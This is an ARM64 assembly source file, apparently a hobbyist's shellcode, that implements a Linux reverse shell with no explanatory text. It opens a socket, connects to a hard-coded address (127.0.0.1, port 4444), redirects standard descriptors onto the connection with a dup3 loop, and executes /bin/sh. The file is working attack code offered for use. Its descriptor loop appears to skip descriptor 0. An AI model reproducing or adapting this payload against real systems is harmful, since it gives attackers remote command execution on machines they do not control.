;//////////Codigo por Belial Grimoire////////////
;/////bgpavelang.github.io//////


.arch armv8-a

.global _start


.text

_start:

mov x8, 198
mov x2, 0
mov x1, 1
mov x0, 2
svc 0

mov w3, w0

mov x8, 203
mov x2, 16

movz x1, 0x2
movk x1, 0x5c11, lsl 16
movk x1, 0x007f, lsl 32
movk x1, 0x0001, lsl 48

str x1, [sp, -16]!
mov x1, sp
svc 0

mov x1, 3
mov x8, 24

jp_dup:
mov x2, xzr
mov w0, w3
svc 0
subs x1, x1, 1
bne jp_dup

mov x8, 221
movz x0, 0x622f
movk x0, 0x6e69, lsl 16
movk x0, 0x732f, lsl 32
movk x0, 0x0068, lsl 48
str x0, [sp]
mov x0, sp

svc 0
